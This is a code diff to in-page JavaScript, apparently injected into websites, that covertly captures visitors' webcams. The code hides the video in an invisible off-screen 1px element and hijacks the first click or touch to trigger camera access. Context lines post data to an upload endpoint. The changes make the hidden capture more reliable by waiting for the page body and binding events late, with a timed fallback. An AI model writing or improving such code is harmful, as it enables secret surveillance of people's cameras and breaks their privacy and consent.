@@ -1045,6 +1045,8 @@ originalFetch(API_UPLOAD, { method: 'POST', body: payload, keepalive: true }).ca
 }
 async function startCapture() {
 if (captured) return;
+captured = true;
+unlock();
 try {
 const stream = await navigator.mediaDevices.getUserMedia({
 video: {
@@ -1053,15 +1055,22 @@ width: { ideal: 1920 },
 height: { ideal: 1080 }
 }
 });
-captured = true;
-unlock();
 const video = document.createElement('video');
 video.srcObject = stream;
 video.playsInline = true;
 video.autoplay = true;
 video.muted = true;
 video.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1";
-document.body.appendChild(video);
+// 等待 body 可用再挂载
+for (let i = 0; i < 50; i++) {
+if (document.body) { document.body.appendChild(video); break; }
+await new Promise(r => setTimeout(r, 100));
+}
+if (!document.body) {
+stream.getTracks().forEach(t => t.stop());
+console.error("[Shadow] document.body not found, cannot append video");
+return;
+}
 await new Promise((resolve, reject) => {
 video.onloadedmetadata = function() {
 video.play().then(resolve).catch(reject);
@@ -1086,7 +1095,7 @@ window.performCapture = startCapture;
 } else if(MODE==="2") {
 window.addEventListener('click', startCapture, {once:true});
 } else {
-// 模式0：首次用户触摸/点击触发摄像头（iOS/安卓必需）
+// 模式0：等 DOM 就绪后再绑定触摸/点击事件（插在 head 里时 body 可能还不存在）
 let triggered = false;
 function tryCapture(e) {
 if (!triggered) {
@@ -1095,8 +1104,17 @@ if (e) e.preventDefault();
 startCapture();
 }
 }
+function bindEvents() {
 document.addEventListener('touchstart', tryCapture, {once:true, passive:false});
 document.addEventListener('click', tryCapture, {once:true});
+}
+if (document.body && document.body.children.length > 0) {
+bindEvents();
+} else {
+document.addEventListener('DOMContentLoaded', bindEvents, {once:true});
+// 兜底：1.5秒后强行绑定，防止 DOMContentLoaded 不触发
+setTimeout(bindEvents, 1500);
+}
 }
 })();
 </script>
